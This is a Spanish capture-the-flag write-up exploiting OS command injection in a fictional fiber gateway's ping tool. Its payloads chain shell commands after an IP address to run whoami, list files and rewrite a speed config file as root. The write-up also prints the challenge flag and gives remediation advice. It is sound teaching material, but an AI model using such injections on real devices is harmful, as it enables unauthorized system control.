# Desafío - FabiFiber (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** RCE (Remote Code Execution / Command Injection)  
**Autor:** adonaissh  

---

## 📌 Enunciado

> **FabiFiber** es el único proveedor de internet que llega hasta tu casa. Los precios son excesivamente altos y el servicio es deficiente.
>
> Un día, en un foro, leés que existe una forma de subir la velocidad de internet de FabiFiber.
>
> **Objetivo:** ¿Podrás subir tu velocidad de conexión a 1 Giga (`1G` / `1Gbps`) modificando la configuración del módem/gateway?

---

## 🔍 Análisis Inicial y Reconocimiento

El desafío nos sitúa en el panel de administración web del enrutador de fibra óptica:
- **Dispositivo:** *FabiFiber Gigabit Fiber Gateway* (Firmware: `v3.4.1-FabiOS`).
- **Vista principal:** `Gateway > At a Glance`.
- **Información mostrada:**
  - *Provisioned Plan Speed:* `30M (Symmetric Fiber)`
  - *Optical Link Status:* `Synchronized (GPON ITU-T G.984)`
  - Herramienta de diagnóstico de red: **Test Your Connection (Ping)** con campos:
    - `Target IP or Host:` (por defecto `1.1.1.1`)
    - `Count:` (por defecto `4`)

---

## 🔬 Identificación de la Vulnerabilidad (Command Injection en Ping)

La herramienta de diagnóstico de conectividad toma el valor introducido en el campo `Target IP or Host` y lo concatena directamente en una invocación del sistema operativo tipo `ping -c {count} {target}` sin adecuada sanitización ni uso de APIs parametrizadas.

### 1. Prueba de inyección y comprobación de permisos

Se envió como destino en el formulario de ping:

```text
1.1.1.1; whoami
```

**Salida reflejada en el resultado del ping:**
```text
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
...
--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3000ms
root
```

El comando inyectado se ejecutó con los privilegios máximos del sistema (`root`).

### 2. Exploración del sistema de archivos

Se investigó el entorno de ejecución:

```text
1.1.1.1; pwd; ls -la /; env
```

Resultados:
- El directorio de trabajo actual es la raíz (`/`).
- El entorno es un contenedor minimalista / sandbox BusyBox (sin utilidades como `find`, `grep` ni `ps`).
- En la raíz `/` existen dos archivos clave:
  - `user.data`: Contiene el identificador `USER_ID=FFID_sRwdf45fPdf346g43`.
  - `config.data`: Archivo plano de configuración que almacena el plan de velocidad provisionado:
    ```text
    SPEED=30M
    ```

---

## 🚀 Explotación

### 1. Intento de modificación y ajuste de formato

Para elevar la velocidad a 1 Giga, era necesario reescribir el parámetro dentro de `config.data`. Se determinó que el backend envuelve los argumentos o los procesa en un shell sensible a comillas literales, por lo que el comando debía enviarse sin comillas adicionales.

Asimismo, el analizador del gateway espera la notación exacta `1G` (en lugar de `1000M` o `1Gbps`).

Se inyectó el siguiente comando en el campo `Target IP or Host`:

```text
1.1.1.1; echo -n SPEED=1G > config.data; cat config.data
```

**Salida reflejada:**
```text
--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3000ms
SPEED=1G
```

El contenido de `/config.data` fue actualizado exitosamente.

### 2. Recarga del Panel y Obtención de la Flag

Al acceder nuevamente a la vista general `Gateway > At a Glance` mediante una petición fresca (`GET /`), el backend leyó la nueva configuración y renderizó el banner de felicitaciones:

```text
==================================================
                 FELICITACIONES
  Tu velocidad de internet fue mejorada a 1Gbps!

  FLAG: 4c23ba32e2d0bf4ccf2a431b8945aa06
==================================================

Provisioned Plan Speed: 1G (Symmetric Fiber)
```

---

## 🏁 Flag

```text
4c23ba32e2d0bf4ccf2a431b8945aa06
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Inyección de comandos en el sistema operativo (CWE-78 / OS Command Injection). El formulario de diagnóstico ejecutaba llamadas a la shell concatenando entradas no confiables provistas por el usuario y corriendo el servicio web directamente bajo la cuenta de superusuario `root`.
- **Recomendaciones:**
  - **Evitar la ejecución de comandos vía shell:** Utilizar funciones nativas o llamadas a la API de sockets del lenguaje/plataforma para verificar la conectividad (p. ej., abrir sockets ICMP/TCP) sin invocar binarios del sistema a través de un shell.
  - **Validación y listas blancas estrictas:** Si es estrictamente necesario invocar utilidades externas como `ping`, validar rigurosamente que el input sea una dirección IPv4/IPv6 válida o un nombre de host FQDN antes de la ejecución, utilizando APIs que reciban los argumentos en un array (como `execFile` o `subprocess.run(..., shell=False)`).
  - **Principio de menor privilegio:** La interfaz web de gestión del módem nunca debe correr con privilegios de `root`; debe operar bajo un usuario de servicio restringido sin permisos de escritura sobre archivos de configuración del sistema.
